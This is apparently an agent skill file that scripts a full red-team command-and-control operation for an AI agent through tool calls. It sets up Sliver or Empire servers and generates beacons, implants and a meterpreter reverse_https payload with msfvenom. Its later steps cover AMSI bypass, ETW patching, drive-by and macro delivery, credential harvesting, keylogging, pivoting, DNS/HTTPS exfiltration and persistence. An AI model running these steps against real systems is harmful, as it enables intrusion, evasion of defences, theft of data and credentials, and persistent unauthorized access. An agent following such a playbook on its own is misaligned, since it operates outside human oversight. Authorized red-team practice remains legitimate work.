---
name: red-team-c2
description: Command and Control infrastructure — C2 framework setup, beacon deployment, evasion, persistent access, data exfiltration
---

# Red Team C2 Skill

Set up and operate Command & Control infrastructure for authorized red team operations.

## Phase 1: C2 Server Setup
1. Use `execute_command`: `apt install -y sliver` or `go install github.com/BishopFox/sliver/server@latest`
2. Alternative: `execute_command`: `docker run -it -v ~/.sliver:/root/.sliver bcsecurity/empire`
3. Use `execute_command`: `sliver-server` (start Sliver C2)
4. Generate listener: configure HTTPS/DNS/WireGuard listeners
5. Use `start_listener` on a fallback port for simple reverse shells

## Phase 2: Implant Generation
6. Sliver beacon: `execute_command`: `generate beacon --http target.com --os linux --format elf --save beacon`
7. Sliver session: `execute_command`: `generate --mtls target.com:443 --os windows --format exe --save implant.exe`
8. Use `payload_generate` type "reverse_shell" for lightweight shells
9. Staged payloads: `execute_command`: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o payload.exe`
10. Use `encode_decode` to obfuscate payloads

## Phase 3: Evasion & Delivery
11. Use `execute_command`: shellcode obfuscation with XOR/AES encryption
12. AMSI bypass for Windows: generate PowerShell bypass scripts
13. ETW patching for evasion
14. Use `stealth_browser` for drive-by download hosting
15. Generate Office macro payloads for document-based delivery

## Phase 4: Post-Exploitation via C2
16. Process migration and injection
17. Credential harvesting from memory (Mimikatz alternatives)
18. Keylogging and screenshot capture
19. Network pivoting through compromised hosts
20. File exfiltration via DNS/HTTPS channels

## Phase 5: Persistence
21. Registry run keys (Windows)
22. Scheduled tasks / cron jobs
23. WMI event subscriptions
24. Service creation / systemd services
25. Store all access methods in `memory_store` for operational continuity
